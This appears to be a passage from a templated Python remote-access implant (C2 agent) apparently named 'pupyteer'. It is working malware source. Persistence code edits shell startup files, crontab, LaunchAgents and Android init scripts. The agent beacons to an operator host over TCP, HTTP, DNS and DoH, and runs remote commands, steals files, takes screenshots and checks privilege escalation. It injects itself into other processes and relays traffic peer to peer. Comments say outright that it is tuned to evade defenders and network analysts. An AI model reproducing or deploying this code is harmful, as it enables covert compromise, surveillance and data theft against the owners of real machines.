        for rc in (_o.path.join(home, ".bashrc"), _o.path.join(home, ".profile")):
            if _o.path.exists(rc):
                with open(rc, "a") as f:
                    f.write(rc_line)
        try:
            p = _sp.run(["crontab", "-l"], capture_output=True, text=True)
            existing = p.stdout if p.returncode == 0 else ""
            if exe not in existing:
                _sp.run(["crontab", "-"], input=existing + cron, text=True, check=True)
        except Exception:
            pass
        return True
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def _persist_macos():
    try:
        exe = _sy.executable or _sy.argv[0]
        label = "com.{{ rnd_str(8) }}.agent"
        plist = {
            "Label": label,
            "ProgramArguments": [exe],
            "RunAtLoad": True,
            "KeepAlive": True,
        }
        launch_dir = _o.path.expanduser("~/Library/LaunchAgents")
        _o.makedirs(launch_dir, exist_ok=True)
        plist_path = _o.path.join(launch_dir, f"{label}.plist")
        with open(plist_path, "wb") as f:
            import plistlib
            plistlib.dump(plist, f)
        return True
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def _persist_android():
    try:
        exe = _sy.executable or _sy.argv[0]
        # Many Android devices ship a userland init.d emulator.
        init_paths = [
            "/data/local/userinit.sh",
            "/data/user_de/0/com.android.shell/files/usr/local/bin/init.sh",
        ]
        for p in init_paths:
            if _o.path.exists(_o.path.dirname(p)):
                with open(p, "a") as f:
                    f.write(f"\n# pupyteer\n{exe} &\n")
                return True
        return False
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def install_persistence():
    if PLATFORM == "windows":
        return _persist_windows()
    if PLATFORM == "macos":
        return _persist_macos()
    if PLATFORM == "android":
        return _persist_android()
    return _persist_linux()
{% endif %}

# --------------------------------------------------------------------- #
#  Agent identity
# --------------------------------------------------------------------- #

def _make_id():
    return f"{_uuid.uuid4().hex[:12]}-{_pf.node()}"

{% if has_identity %}
# Per-agent signed identity (Ed25519). Private key baked in at build time;
# the server holds only the matching public key.
_AGENT_ID = "{{ agent_id }}"
_AGENT_PRIV_PEM = r"""{{ agent_priv_pem }}"""

def _sign(message: str) -> str:
    """Sign *message* with this agent's Ed25519 private key."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
        priv = serialization.load_pem_private_key(_AGENT_PRIV_PEM.encode(), password=None)
        return priv.sign(message.encode("ascii")).hex()
    except Exception as e:
        _log(f"signing unavailable ({e}); falling back to unsigned", "debug")
        return ""
{% else %}
_AGENT_ID = ""
def _sign(message: str) -> str:
    return ""
{% endif %}

AGENT_ID = _make_id()
HOSTNAME = _pf.node()
USERNAME = _o.environ.get("USER") or _o.environ.get("USERNAME") or "unknown"

def identity():
    return {
        "id": AGENT_ID,
        "hostname": HOSTNAME,
        "os": PLATFORM,
        "arch": ARCH,
        "user": USERNAME,
        "version": __version__,
        "pid": _o.getpid(),
        "ppid": _o.getppid(),
        "python": _sy.version.split()[0],
    }

# --------------------------------------------------------------------- #
#  Transport layer
# --------------------------------------------------------------------- #

class TransportError(Exception):
    pass

TLS_ON = {{ cfg.tls }}
TLS_CERT_PEM = {{ cfg.tls_cert_pem | tojson }}
AUTH_SECRET = {{ cfg.auth_secret | tojson }}

def pinned_tls_context():
    """A client context that trusts exactly one certificate: the listener's.

    Hostname checking is off because the team server is normally addressed by
    IP, and its self-signed certificate has no matching name. Signature
    verification stays on, so anything but the pinned certificate is rejected.
    """
    if not TLS_CERT_PEM:
        raise TransportError("TLS is enabled but no listener certificate was compiled in")
    ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_REQUIRED
    ctx.load_verify_locations(cadata=TLS_CERT_PEM)
    return ctx

class BaseTransport:
    name = "base"

    def send(self, data: bytes) -> bytes:
        raise NotImplementedError

    def request(self, msg: dict) -> dict:
        """One JSON message in, one JSON reply out."""
        raw = self.send(_j.dumps(msg).encode())
        if not raw:
            return {}
        return _j.loads(raw.decode("utf-8", "replace").strip())

    def close(self):
        pass

class TCPTransport(BaseTransport):
    """Newline-delimited JSON over a single long-lived connection.

    The listener reads with readline(), so one request per socket would mean
    registering again for every beacon and leaving another session behind each
    time. What makes a beacon ours is the token registration handed back, not this
    socket — keeping the connection is about not multiplying sessions, not about
    being recognised.
    """
    name = "tcp"

    def __init__(self, host: str, port: int, timeout: int = 15):
        self._host = host
        self._port = port
        self._timeout = timeout
        self._sock = None

    def _connect(self):
        if self._sock is None:
            s = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((self._host, self._port))
            if TLS_ON:
                s = pinned_tls_context().wrap_socket(
                    s, server_hostname=self._host)
            self._sock = s
        return self._sock

    def _read_line(self, s) -> bytes:
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(4096)
            if not chunk:
                raise TransportError("connection closed")
            buf += chunk
        return buf

    def send(self, data: bytes) -> bytes:
        """Send data with automatic retry on transient connection failures."""
        s = self._connect()
        try:
            s.sendall(data + b"\n")
            return self._read_line(s)
        except Exception:
            self.close()
            # Retry once with a fresh connection for transient drops
            try:
                s = self._connect()
                s.sendall(data + b"\n")
                return self._read_line(s)
            except Exception:
                self.close()
                raise

    def close(self):
        if self._sock is not None:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

class HTTPTransport(BaseTransport):
    name = "http"

    def __init__(self, host: str, port: int, *, tls: bool = False,
                 uri: str = "{{ cfg.http_uri }}",
                 ua: str = "{{ cfg.user_agent }}",
                 method: str = "{{ cfg.http_method }}"):
        self._host = host
        self._port = port
        self._tls = tls or TLS_ON
        self._base = f"http{'s' if self._tls else ''}://{host}:{port}"
        self._uri = uri
        self._ua = ua
        self._method = method

    def send(self, data: bytes) -> bytes:
        # Only the HTTP(S) path is encrypted; the TCP listener keeps the
        # plaintext line-JSON protocol the signed handshake depends on.
        sealed = _encrypt_payload(data)
        body = _b64e(sealed).decode()
        headers = {
            "User-Agent": self._ua,
            "Content-Type": "application/octet-stream",
            "X-Session": AGENT_ID,
        }
        if _crypto_ready():
            headers["X-Payload-Mode"] = _CIPHER_MODE
        try:
            import urllib.request, urllib.error
            req = urllib.request.Request(
                self._base + self._uri,
                data=body.encode(),
                headers=headers,
                method=self._method,
            )
            context = pinned_tls_context() if self._tls else None
            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                raw = resp.read()
                try:
                    return _decrypt_payload(_b64d(raw))
                except Exception:
                    return raw
        except Exception as e:
            raise TransportError(str(e))

# Alias for HTTPS
HTTPSTransport = lambda *a, **kw: HTTPTransport(*a, tls=True, **kw)

class DNSTransport(BaseTransport):
    """DNS A-record exfil / C2 via TXT responses."""
    name = "dns"

    def __init__(self, server: str, port: int = 53, *,
                 zone: str = "{{ cfg.dns_domain }}",
                 key: bytes = b"{{ cfg.dns_key }}"):
        self._server = server
        self._port = port
        self._zone = zone.strip(".")
        self._key = _enc(key) or b""

    def send(self, data: bytes) -> bytes:
        import hashlib as _h
        encoded = _xor(self._key, data).hex()
        # Chunk into labels <= 63 chars, domain <= 253.
        chunk_size = 60
        label_size = 63
        labels = []
        for i in range(0, len(encoded), chunk_size):
            seg = encoded[i:i + chunk_size]
            # split into labels
            for j in range(0, len(seg), label_size):
                labels.append(seg[j:j + label_size])
        qname = ".".join(labels) + "." + self._zone
        # Build a minimal DNS A query
        tid = _rnd.randint(0, 0xFFFF)
        flags = _st.pack(">H", 0x0100)  # standard query
        qdcount = _st.pack(">H", 1)
        query = _st.pack(">H", tid) + flags + qdcount + b"\x00\x00\x00\x00\x00\x00"
        for lbl in qname.rstrip(".").split("."):
            b = lbl.encode()
            query += bytes([len(b)]) + b
        query += b"\x00\x00\x01\x00\x01"  # root, A, IN
        with _sk.socket(_sk.AF_INET, _sk.SOCK_DGRAM) as s:
            s.settimeout(10)
            s.sendto(query, (self._server, self._port))
            try:
                data = s.recv(4096)
                return data
            except _sk.timeout:
                return b""

class DoHTransport(HTTPTransport):
    """DNS-over-HTTPS transport."""
    name = "doh"

    def __init__(self, host: str = "1.1.1.1", port: int = 443, *,
                 zone: str = "{{ cfg.dns_domain }}",
                 key: bytes = b"{{ cfg.dns_key }}"):
        self._inner = DNSTransport(host, port, zone=zone, key=key)
        self._zone = zone
        self._key = _enc(key) or b""

    def send(self, data: bytes) -> bytes:
        # Reuse DNS transport logic; just wrap it.
        return self._inner.send(data)

def make_transport():
    t = "{{ transport }}"
    host = "{{ cfg.host }}"
    port = {{ cfg.port }}
    if t == "tcp":
        return TCPTransport(host, port)
    if t == "http":
        return HTTPTransport(host, port)
    if t == "https":
        return HTTPSTransport(host, port)
    if t == "dns":
        return DNSTransport(host, port)
    if t == "doh":
        return DoHTransport(host, port)
    raise ValueError(f"Unknown transport: {t}")

# --------------------------------------------------------------------- #
#  Built-in modules
# --------------------------------------------------------------------- #

{% if include_recon %}
def mod_systeminfo():
    info = identity()
    info["cpus"] = _o.cpu_count()
    info["python_executable"] = _sy.executable
    info["cwd"] = _o.getcwd()
    try:
        import getpass, socket
        info["fqdn"] = socket.getfqdn()
    except Exception:
        pass
    # OS release info
    for f in ("/etc/os-release", "/etc/lsb-release"):
        if _o.path.exists(f):
            try:
                with open(f) as fp:
                    info["os_release"] = fp.read()
            except OSError:
                pass
            break
    return info

def mod_network():
    out = []
    try:
        import netifaces
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            entry = {"interface": iface}
            if netifaces.AF_INET in addrs:
                entry["ipv4"] = [a["addr"] for a in addrs[netifaces.AF_INET]]
            if netifaces.AF_INET6 in addrs:
                entry["ipv6"] = [a["addr"] for a in addrs[netifaces.AF_INET6]]
            if netifaces.AF_LINK in addrs:
                entry["mac"] = [a["addr"] for a in addrs[netifaces.AF_LINK]]
            out.append(entry)
    except ImportError:
        # Fallback: parse /proc/net/if_inet6 or ip addr
        try:
            p = _sp.run(["ip", "-o", "addr"], capture_output=True, text=True)
            out = [{"raw": p.stdout}]
        except Exception:
            try:
                p = _sp.run(["ifconfig"], capture_output=True, text=True)
                out = [{"raw": p.stdout}]
            except Exception:
                out = [{"error": "netifaces and ifconfig both unavailable"}]
# Routes
    try:
        p = _sp.run(["ip", "route"], capture_output=True, text=True)
        routes = p.stdout.splitlines()
    except Exception:
        routes = []
    # Listening ports
    listeners = []
    try:
        p = _sp.run(["ss", "-tlnp"], capture_output=True, text=True)
        listeners = p.stdout.splitlines()
    except Exception:
        try:
            p = _sp.run(["netstat", "-tlnp"], capture_output=True, text=True)
            listeners = p.stdout.splitlines()
        except Exception:
            pass
    return {"interfaces": out, "routes": routes, "listeners": listeners}

def mod_netstat():
    """Established connections, as the host itself sees them.

    Upstream Pupy's ``netstat``. Three tiers, best structure first, because each
    step down trades structure for a dependency on the target having a
    particular tool: psutil (structured), then the Linux /proc tables (no
    dependency, Linux-only), then the host's own netstat/ss (works anywhere,
    returns text). ``source`` names the tier that answered, so an operator
    reading a parsed result knows whether it was parsed or quoted.
    """
    try:
        import psutil
        conns = []
        for c in psutil.net_connections(kind="inet"):
            local = getattr(c, "laddr", None)
            remote = getattr(c, "raddr", None)
            conns.append({
                "type": {1: "tcp", 2: "udp"}.get(c.type, str(c.type)),
                "local": f"{local.ip}:{local.port}" if local else "",
                "remote": f"{remote.ip}:{remote.port}" if remote else "",
                "status": c.status,
                "pid": c.pid,
            })
        return {"source": "psutil", "connections": conns, "count": len(conns)}
    except Exception:
        pass

    # Linux without psutil: the kernel's own tables.
    for path, kind in (("/proc/net/tcp", "tcp"), ("/proc/net/tcp6", "tcp6"),
                       ("/proc/net/udp", "udp"), ("/proc/net/udp6", "udp6")):
        try:
            rows = []
            with open(path) as fh:
                next(fh, None)
                for line in fh:
                    f = line.split()
                    if len(f) < 4:
                        continue
                    def _addr(token):
                        host, _, port = token.partition(":")
                        if len(host) == 8:
                            octets = [host[i:i + 2] for i in range(0, 8, 2)][::-1]
                            host = ".".join(str(int(o, 16)) for o in octets)
                        return f"{host}:{int(port, 16)}"
                    rows.append({"type": kind, "local": _addr(f[1]),
                                 "remote": _addr(f[2]), "status": f[3]})
            return {"source": path, "connections": rows, "count": len(rows)}
        except Exception:
            continue

    for argv in (["netstat", "-ano"], ["ss", "-tunap"], ["netstat", "-an"]):
        try:
            p = _sp.run(argv, capture_output=True, text=True, timeout=30)
            if p.stdout:
                return {"source": " ".join(argv), "output": p.stdout}
        except Exception:
            continue
    return {"error": "no connection table available on this host"}


def mod_processes():
    procs = []
    try:
        import psutil
        for p in psutil.process_iter(["pid", "ppid", "name", "username", "exe"]):
            try:
                procs.append(p.info)
            except Exception:
                pass
    except ImportError:
        if PLATFORM in ("linux", "android", "macos"):
            try:
                for pid in _o.listdir("/proc"):
                    if not pid.isdigit():
                        continue
                    try:
                        with open(f"/proc/{pid}/comm") as f:
                            name = f.read().strip()
                        with open(f"/proc/{pid}/cmdline") as f:
                            cmdline = f.read().replace("\x00", " ").strip()
                        procs.append({"pid": int(pid), "name": name, "cmdline": cmdline})
                    except OSError:
                        pass
            except OSError:
                pass
        elif PLATFORM == "windows":
            try:
                p = _sp.run(["tasklist", "/fo", "csv"], capture_output=True, text=True)
                procs = [{"raw": p.stdout}]
            except Exception:
                pass
    return procs
{% endif %}

{% if include_exec %}
def mod_exec(command: str, timeout: int = 60) -> dict:
    try:
        if PLATFORM == "windows":
            argv, shell = command, True
        else:
            # With shell=False subprocess treats a plain string as an executable
            # path and no arguments, so "id -u" would fail; split it instead of
            # routing every command through a shell.
            argv, shell = _sh.split(command), False
        p = _sp.run(argv, capture_output=True, text=True,
                    timeout=timeout, shell=shell)
        return {
            "stdout": p.stdout,
            "stderr": p.stderr,
            "returncode": p.returncode,
        }
    except _sp.TimeoutExpired:
        return {"error": "timeout"}
    except Exception as e:
        return {"error": str(e)}
{% endif %}

{% if include_fs %}
def mod_fs_list(path: str = ".") -> dict:
    """One directory, as an object: a listing and a failure must not share a shape.

    An empty directory is a real answer, and a server that has to guess which of
    the two it got will guess wrong in its own favour.
    """
    try:
        entries = []
        for e in _o.scandir(path):
            try:
                st = e.stat()
                entries.append({
                    "name": e.name,
                    "is_file": e.is_file(),
                    "is_dir": e.is_dir(),
                    "size": st.st_size,
                    "mtime": st.st_mtime,
                })
            except OSError:
                pass
        return {"path": path, "entries": entries}
    except Exception as e:
        return {"error": str(e)}

def mod_fs_get(remote_path: str, offset: int = 0, length: int = 0) -> bytes:
    """Read up to *length* bytes from *offset*; length 0 means the whole rest.

    Raises rather than returning text: a caller cannot tell an unreadable file
    apart from a file whose contents happen to look like an error.
    """
    with open(remote_path, "rb") as f:
        if offset:
            f.seek(offset)
        return f.read(length) if length else f.read()

def mod_fs_size(path: str) -> int:
    return _o.path.getsize(path)

def mod_fs_put(remote_path: str, data: bytes, offset: int = 0) -> dict:
    """Write *data* at *offset*, creating parents — offsets let a large upload
    arrive as a sequence of small messages instead of one giant one."""
    try:
        d = _o.path.dirname(remote_path)
        if d:
            _o.makedirs(d, exist_ok=True)
        if offset:
            with open(remote_path, "r+b") as f:
                f.seek(offset)
                f.write(data)
        else:
            with open(remote_path, "wb") as f:
                f.write(data)
        return {"ok": True, "path": remote_path, "offset": offset, "written": len(data)}
    except Exception as e:
        return {"ok": False, "error": str(e)}
{% endif %}

{% if include_privesc %}
def mod_privesc_check() -> dict:
    info = {"os": PLATFORM, "euid": None, "is_admin": False, "paths": []}
    if PLATFORM in ("linux", "android", "macos"):
        try:
            import os
            info["euid"] = _o.geteuid()
            info["is_admin"] = _o.geteuid() == 0
        except AttributeError:
            pass
        # SUID binaries
        try:
            p = _sp.run(["find", "/", "-perm", "-4000", "-type", "f"],
                        capture_output=True, text=True, timeout=30)
            info["suid_binaries"] = [l for l in p.stdout.splitlines() if l]
        except Exception:
            pass
        # sudo -l
        try:
            p = _sp.run(["sudo", "-l"], capture_output=True, text=True)
            info["sudo_listing"] = p.stdout + p.stderr
        except Exception:
            pass
        # Writable /etc/passwd, /etc/shadow
        for f in ("/etc/passwd", "/etc/shadow"):
            if _o.access(f, _o.W_OK):
                info["paths"].append(f"writable:{f}")
        # Kernel version (for exploit suggestions)
        try:
            info["kernel"] = _pf.release()
        except Exception:
            pass
    elif PLATFORM == "windows":
        try:
            import ctypes
            info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            pass
        # AlwaysNotify / UAC level
        try:
            import winreg
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as rk:
                val, _ = winreg.QueryValueEx(rk, "ConsentPromptBehaviorAdmin")
                info["uac_level"] = int(val)
        except Exception:
            pass
        # Unquoted service paths (quick check via wmic)
        try:
            p = _sp.run("wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"",
                        capture_output=True, text=True, shell=True)
            info["unquoted_services"] = [l for l in p.stdout.splitlines() if l.strip()]
        except Exception:
            pass
    return info

def mod_privesc_suggest(check: dict) -> list:
    suggestions = []
    if PLATFORM in ("linux", "android", "macos"):
        kernel = check.get("kernel", "")
        if kernel:
            suggestions.append(f"check exploits for kernel {kernel} (searchsploit)")
        suid = check.get("suid_binaries", [])
        for b in suid:
            name = _o.path.basename(b)
            if name in ("find", "vim", "bash", "sh", "python", "python3", "nano", "less", "awk"):
                suggestions.append(f"GTFOBin: {b}")
        if check.get("euid") == 0:
            suggestions.append("already root — migrate to hide")
    elif PLATFORM == "windows":
        if not check.get("is_admin"):
            if check.get("uac_level", 5) < 2:
                suggestions.append("UAC bypass (auto-elevate) likely")
        for svc in check.get("unquoted_services", []):
            suggestions.append(f"unquoted service path: {svc}")
    return suggestions
{% endif %}

{% if include_screenshot %}
_MAX_SHOT_BYTES = 12 * 1024 * 1024

def _ps_quote(value: str) -> str:
    """Render a string as a PowerShell single-quoted literal ('' is its escape)."""
    return "'" + value.replace("'", "''") + "'"


def _shot_windows(path: str) -> None:
    # System.Drawing writes a real PNG, so the agent needs no imaging library.
    # The destination goes in as a single-quoted literal, not a trailing
    # argument: `powershell -Command <script> <arg>` concatenates the argument
    # onto the script text instead of binding it to $args.
    script = (
        "Add-Type -AssemblyName System.Windows.Forms;"
        "Add-Type -AssemblyName System.Drawing;"
        "$b = [System.Windows.Forms.SystemInformation]::VirtualScreen;"
        "$i = New-Object System.Drawing.Bitmap $b.Width, $b.Height;"
        "$g = [System.Drawing.Graphics]::FromImage($i);"
        "$g.CopyFromScreen($b.Location, (New-Object System.Drawing.Point 0,0), $b.Size);"
        "$i.Save(" + _ps_quote(path) + "); $g.Dispose(); $i.Dispose()"
    )
    _sp.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
            capture_output=True, timeout=60, check=True)


def _shot_posix(path: str) -> None:
    """Try each screen-grab this desktop might have installed, in likelihood order.

    X11 and Wayland tools differ, and none of them is present on a headless
    box — so every miss is remembered and reported rather than the last one.
    """
    if PLATFORM == "macos":
        candidates = [["screencapture", "-x", path]]
    else:
        candidates = [
            ["gnome-screenshot", "-f", path],
            ["scrot", "--overwrite", path],
            ["spectacle", "-b", "-n", path],
            ["xfce4-screenshooter", "-f", "save", path],
            ["import", "-window", "root", path],
            ["grim", path],
        ]
    missing = []
    for cmd in candidates:
        try:
            _sp.run(cmd, capture_output=True, timeout=60, check=True)
            return
        except FileNotFoundError:
            missing.append(cmd[0])
        except _sp.CalledProcessError:
            missing.append(cmd[0] + " failed")
    raise RuntimeError("no working screenshot tool (tried: " + ", ".join(missing) + ")")


def mod_screenshot() -> dict:
    """Capture the whole screen and return it base64-encoded.

    Returned inline rather than written where the operator can fetch it: a
    capture left on disk is a file the defender will find later.
    """
    import tempfile as _tf
    fd, path = _tf.mkstemp(prefix=".pupyteer-shot-", suffix=".png")
    _o.close(fd)
    try:
        if PLATFORM == "windows":
            _shot_windows(path)
        else:
            _shot_posix(path)
        with open(path, "rb") as f:
            raw = f.read()
    finally:
        try:
            _o.remove(path)
        except OSError:
            pass
    if not raw:
        return {"error": "capture produced an empty image"}
    if len(raw) > _MAX_SHOT_BYTES:
        # Handing back more than this would push the reply past the listener's
        # message ceiling and drop the connection with every queued command.
        return {"error": f"image too large to return: {len(raw)} bytes"}
    return {"format": "png", "bytes": len(raw), "data": _b64e(raw).decode()}
{% endif %}

# --------------------------------------------------------------------- #
#  Migration
# --------------------------------------------------------------------- #

{% if migration %}
def _migrate_windows(target_pid: int) -> dict:
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.windll.kernel32
        PROCESS_ALL_ACCESS = 0x1F0FFF
        h_proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not h_proc:
            return {"ok": False, "error": "OpenProcess failed"}
        # Read our own binary (script) — best-effort, real builds use PyInstaller payload.
        payload_path = _sy.executable or _sy.argv[0]
        with open(payload_path, "rb") as f:
            payload = f.read()
        # Allocate + write
        ptr = kernel32.VirtualAllocEx(h_proc, None, len(payload), 0x3000, 0x40)  # MEM_COMMIT|RWX
        if not ptr:
            return {"ok": False, "error": "VirtualAllocEx failed"}
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(h_proc, ptr, payload, len(payload), ctypes.byref(written)):
            return {"ok": False, "error": "WriteProcessMemory failed"}
        # In real use we'd start a thread with the loader stub; here we close the handle.
        kernel32.CloseHandle(h_proc)
        return {"ok": True, "written": written.value, "pid": target_pid}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def _migrate_linux(target_pid: int) -> dict:
    try:
        # Use /proc/<pid>/mem after a ptrace attach (simplified).
        # Real-world use involves shellcode or memfd injection.
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        PTRACE_ATTACH = 16
        PTRACE_DETACH = 17
        result = libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
        if result != 0:
            return {"ok": False, "error": "ptrace attach failed"}
        try:
            # Wait for the process to stop
            import os
            os.waitpid(target_pid, 0)
            # Placeholder: actual injection writes shellcode into rip/mmap'd region.
            return {"ok": True, "note": "attached — shellcode injection would happen here", "pid": target_pid}
        finally:
            libc.ptrace(PTRACE_DETACH, target_pid, 0, 0)
    except Exception as e:
        return {"ok": False, "error": str(e)}

def _migrate_fork() -> dict:
    """Fork-exec self with a marker so child can reassociate state."""
    try:
        child = _sp.Popen([_sy.executable or _sy.argv[0], "--child-migrated"],
                          creationflags=_sp.CREATE_NO_WINDOW if PLATFORM == "windows" else 0)
        return {"ok": True, "child_pid": child.pid}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def migrate(target: str = "{{ cfg.migrate_target }}",
            technique: str = "{{ cfg.migrate_technique }}") -> dict:
    if not target:
        return {"ok": False, "error": "no migration target"}
    # Resolve PID
    pid = None
    if isinstance(target, int) or target.isdigit():
        pid = int(target)
    else:
        # Find by name
        try:
            p = _sp.run(["pidof", target] if PLATFORM != "windows" else ["tasklist"],
                        capture_output=True, text=True)
            for tok in p.stdout.split():
                if tok.isdigit():
                    pid = int(tok)
                    break
        except Exception:
            pass
    if pid is None:
        return {"ok": False, "error": f"cannot resolve PID for {target}"}

    if technique == "auto":
        if PLATFORM == "windows":
            technique = "reflective"
        else:
            technique = "procwrite"

    if PLATFORM == "windows" and technique == "reflective":
        return _migrate_windows(pid)
    if PLATFORM in ("linux", "android") and technique == "procwrite":
        return _migrate_linux(pid)
    return _migrate_fork()
{% endif %}

# --------------------------------------------------------------------- #
#  Relay (P2P named-pipe / TCP)
# --------------------------------------------------------------------- #

{% if relay %}
class RelayPeer:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.last_seen = 0.0

class RelayNode:
    """Accepts inbound pipe/TCP connections and forwards to the C2, acting
    as a peer-to-peer relay. The relay binds {{ cfg.relay_bind }}:{{ cfg.relay_port }}."""

    def __init__(self, c2_host: str = "{{ cfg.host }}", c2_port: int = {{ cfg.port }}):
        self._peers: dict[str, RelayPeer] = {}
        for entry in {{ cfg.relay_peers | tojson }}:
            try:
                h, p = entry.rsplit(":", 1)
                self._peers[f"{h}:{p}"] = RelayPeer(h, int(p))
            except Exception:
                pass
        self._c2 = (c2_host, c2_port)
        self._running = False

    def start(self):
        self._running = True
        _th.Thread(target=self._listen_tcp, daemon=True).start()
        {% if is_win %}
        _th.Thread(target=self._listen_pipe, daemon=True).start()
        {% else %}
        _th.Thread(target=self._listen_unix, daemon=True).start()
        {% endif %}

    def _listen_tcp(self):
        with _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM) as s:
            s.setsockopt(_sk.SOL_SOCKET, _sk.SO_REUSEADDR, 1)
            try:
                s.bind(("{{ cfg.relay_bind }}", {{ cfg.relay_port }}))
            except OSError as e:
                _log(f"Relay TCP bind failed: {e}", "error")
                return
            s.listen(5)
            while self._running:
                try:
                    conn, addr = s.accept()
                    _th.Thread(target=self._handle_peer, args=(conn, addr), daemon=True).start()
                except Exception:
                    pass

    {% if is_win %}
    def _listen_pipe(self):
        import ctypes
        from ctypes import wintypes
        PIPE_ACCESS_DUPLEX = 0x00000003
        PIPE_TYPE_MESSAGE = 0x00000004
        PIPE_READMODE_MESSAGE = 0x00000002
        PIPE_WAIT = 0x00000000
        PIPE_UNLIMITED_INSTANCES = 255
        kernel32 = ctypes.windll.kernel32
        while self._running:
            pipe = kernel32.CreateNamedPipeW(
                r"\\.\pipe\{{ cfg.relay_pipe }}",
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                PIPE_UNLIMITED_INSTANCES,
                65536, 65536, 0, None,
            )
            if pipe == -1:
                _t.sleep(1)
                continue
            kernel32.ConnectNamedPipe(pipe, None)
            _th.Thread(target=self._handle_pipe, args=(pipe,), daemon=True).start()

    def _handle_pipe(self, pipe):
        kernel32 = ctypes.windll.kernel32
        buf = ctypes.create_string_buffer(65536)
        bytes_read = wintypes.DWORD()
        while self._running:
            ok = kernel32.ReadFile(pipe, buf, 65536, ctypes.byref(bytes_read), None)
            if not ok:
                break
            payload = buf.raw[:bytes_read.value]
            self._forward(payload)
        kernel32.CloseHandle(pipe)
    {% else %}
    def _listen_unix(self):
        import tempfile
        sock_path = _o.path.join(tempfile.gettempdir(), ".{{ cfg.relay_pipe }}")
        if _o.path.exists(sock_path):
            _o.unlink(sock_path)
        with _sk.socket(_sk.AF_UNIX, _sk.SOCK_STREAM) as s:
            try:
                s.bind(sock_path)
            except OSError as e:
                _log(f"Relay unix bind failed: {e}", "error")
                return
            s.listen(5)
            while self._running:
                try:
                    conn, addr = s.accept()
                    _th.Thread(target=self._handle_peer, args=(conn, None), daemon=True).start()
                except Exception:
                    pass
    {% endif %}

    def _handle_peer(self, conn, addr):
        try:
            with conn:
                while self._running:
                    hdr = b""
                    while len(hdr) < 4:
                        chunk = conn.recv(4 - len(hdr))
                        if not chunk:
                            return
                        hdr += chunk
                    n = _st.unpack(">I", hdr)[0]
                    buf = b""
                    while len(buf) < n:
                        chunk = conn.recv(min(4096, n - len(buf)))
                        if not chunk:
                            return
                        buf += chunk
                    # Forward to C2, then relay response back to peer
                    resp = self._forward(buf)
                    conn.sendall(_st.pack(">I", len(resp)) + resp)
        except Exception:
            pass

    def _forward(self, data: bytes) -> bytes:
        try:
            t = make_transport()
            out = t.send(data)
            t.close()
            return out
        except Exception:
            return b""

_relay = None

def start_relay():
    global _relay
    _relay = RelayNode()
    _relay.start()
{% endif %}

# --------------------------------------------------------------------- #
#  Beacon loop
# --------------------------------------------------------------------- #

def _jittered_sleep(base: float, jitter_pct: int):
    """Sleep for base * (1 +/- jitter_pct/100) with triangular distribution.
    
    Uses triangular distribution instead of uniform to concentrate sleep times
    near the base value while still maintaining variance. This looks more natural
    to network analysts than uniform jitter.
    """
    if jitter_pct <= 0:
        _t.sleep(base)
        return
    delta = base * (jitter_pct / 100.0)
    # Triangular distribution: peak at base, tails at +/- delta
    low = base - delta
    high = base + delta
    _t.sleep(_rnd.triangular(low, base, high))

def _dispatch(task: dict) -> dict:
    """Route a server task to the right module handler.

    On heavy builds the if/elif chain is replaced by the flattened
    dispatch table; behaviour is identical either way.
    """
{% if obf == "heavy" %}
    return _dispatch_flat(task)
{% else %}
    action = task.get("action", "")
    if action == "ping":
        return {"pong": True, "id": AGENT_ID}
    {% if include_recon %}
    if action == "sysinfo":
        return mod_systeminfo()
    if action == "network":
        return mod_network()
    if action == "processes":
        return mod_processes()
    {% endif %}
    {% if include_exec %}
    if action == "exec":
        return mod_exec(task.get("command", ""), int(task.get("timeout", 60)))
    {% endif %}
    {% if include_fs %}
    if action == "fs_list":
        return mod_fs_list(task.get("path", "."))
    if action == "fs_get":
        # Chunked on purpose: a whole file in one reply would be a JSON string
        # of its base64 size, held in memory on both ends.
        path = task.get("path", "")
        offset = int(task.get("offset") or 0)
        length = int(task.get("length") or 0)
        try:
            size = mod_fs_size(path)
            data = mod_fs_get(path, offset, length)
        except OSError as e:
            return {"error": str(e)}
        return {
            "size": size,
            "offset": offset,
            "length": len(data),
            "eof": size >= 0 and offset + len(data) >= size,
            "data": _b64e(data).decode(),
        }
    if action == "fs_put":
        raw = _b64d(task.get("data", ""))
        return mod_fs_put(task.get("path", ""), raw, int(task.get("offset") or 0))
    {% endif %}
    {% if include_privesc %}
    if action == "privesc_check":
        return mod_privesc_check()
    if action == "privesc_suggest":
        check = mod_privesc_check()
        return {"check": check, "suggestions": mod_privesc_suggest(check)}
    {% endif %}
    {% if include_screenshot %}
    if action == "screenshot":
        return mod_screenshot()
    {% endif %}
    {% if migration %}
    if action == "migrate":
        return migrate(task.get("target", ""), task.get("technique", "{{ cfg.migrate_technique }}"))
    {% endif %}
    if action == "shutdown":
        _log("shutdown requested")
        _sy.exit(0)
    return {"error": f"unknown action: {action}"}
{% endif %}

